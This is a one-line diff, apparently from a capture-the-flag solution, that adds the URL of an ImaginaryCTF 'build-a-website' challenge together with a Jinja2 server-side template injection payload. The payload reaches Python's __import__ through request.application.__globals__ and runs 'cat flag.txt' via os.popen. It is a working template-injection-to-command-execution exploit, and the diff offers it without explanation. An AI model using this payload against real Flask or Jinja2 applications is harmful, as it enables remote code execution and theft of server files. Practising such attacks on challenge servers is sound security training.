@@ -1,0 +1,1 @@
+"https://build-a-website.chal.imaginaryctf.org/site", "{{request['application'][request.args.param]['__builtins__']['__import__']('os')['popen']('cat flag.txt')['read']()}}"&param="__globals__"
